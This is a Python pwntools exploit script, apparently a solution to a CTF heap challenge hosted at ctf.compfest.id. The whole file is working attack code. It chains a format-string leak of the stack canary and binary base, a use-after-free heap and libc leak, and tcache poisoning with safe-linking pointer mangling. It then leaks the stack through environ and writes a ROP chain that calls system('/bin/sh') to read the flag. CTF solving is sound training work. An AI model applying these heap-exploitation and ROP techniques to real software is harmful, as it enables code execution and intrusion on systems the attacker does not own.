#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'ctf.compfest.id', 7001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# breakrva 0x15a6
breakrva 0x184c
c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def add(idx, size, data):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())
    io.sendlineafter(b':', data)

def view(idx):
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', str(idx).encode())

def remove(idx):
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    heap = 0x0
    canary = 0x0
    io = initialize()

    add(1, 0x78, b'%p|%p|%p|%p|%p|%p|%p|%p|%p|')
    view(1)
    io.recvuntil(b'note:\n')
    for i in range(6):
        io.recvuntil(b'|')
    canary = int(io.recvuntil(b'|', drop=True), 16)
    io.recvuntil(b'|')
    elf.address = int(io.recvuntil(b'|', drop=True), 16) - 0x17f5

    remove(1)
    view(1)
    io.recvuntil(b'note:\n')
    heap = u64(io.recvline().strip().ljust(8, b'\x00')) << 12

    add(1, 0x78, b'A')
    for i in range(2, 8):
        add(i, 0x78, b'B')
    add(8, 0x78, b'C')
    add(9, 0x78, b'D')
    add(10, 0x78, b'E')

    for i in range(20):
        add(10, 0x78, b'E')

    for i in range(1, 9):
        remove(i)
    remove(9)
    remove(8)

    for i in range(7):
        add(10, 0x78, b'E')
    add(10, 0x78, p64(mangle(heap, heap+0x290)))
    add(10, 0x78, b'E')
    add(10, 0x78, b'E')
    add(10, 0x78, p64(0x0) + p64(0x481))

    remove(1)
    view(1)
    io.recvuntil(b'note:\n')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x21ace0
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    for i in range(20):
        add(1, 0x78, b'consume')

    for i in range(9):
        add(i+1, 0x20, b'A')
    for i in range(9):
        remove(i+1)
    remove(8)

    for i in range(7):
        add(10, 0x20, b'B')
    add(10, 0x20, p64(mangle(heap+0x1860, elf.sym['notes'])))
    add(10, 0x20, b'consume')
    add(10, 0x20, b'consume')
    add(10, 0x20, p64(libc.sym['environ']))

    view(1)
    io.recvuntil(b'note:\n')
    stack = u64(io.recvline().strip().ljust(8, b'\x00'))
    rip = stack - 0x120

    for i in range(9):
        add(i+1, 0x40, b'A')
    for i in range(9):
        remove(i+1)
    remove(8)

    for i in range(7):
        add(10, 0x40, b'B')
    add(10, 0x40, p64(mangle(heap+0x1af0, rip-0x8)))
    add(10, 0x40, b'consume')
    add(10, 0x40, b'consume')
    add(10, 0x40, flat([
        0x0,
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        ret,
        libc.sym['system']
    ]))

    io.sendlineafter(b'>>', b'4')
    io.sendline(b'cat flag*')

    log.info("heap base: %#x", heap)
    log.info("libc base: %#x", libc.address)
    log.info("canary: %#x", canary)
    log.info("rip: %#x", rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
